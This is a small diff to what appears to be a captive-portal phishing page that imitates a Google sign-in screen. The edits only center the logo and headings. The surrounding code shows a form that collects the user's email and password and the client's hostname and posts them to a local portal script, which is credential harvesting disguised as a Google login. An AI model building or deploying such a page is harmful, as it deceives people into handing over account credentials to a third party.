@@ -27,9 +27,9 @@ require_once('helper.php');
 </head>
 <body>
 <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()">
-	<img src="assets/img/1ckkcu79ho.gif" alt="">
+	<center><img src="assets/img/1ckkcu79ho.gif" alt="">
 	<h1>Sign in</h1>
-	<h2>with your Google Account</h2>
+	<h2>with your Google Account</h2></center>
 	<input id="user" type="text" name="email" placeholder="Enter your email"  _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
 	<input type="password" name="password" placeholder="Enter your password" autocorrect="off" autocomplete="off" autocapitalize="off" required>
 	<input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
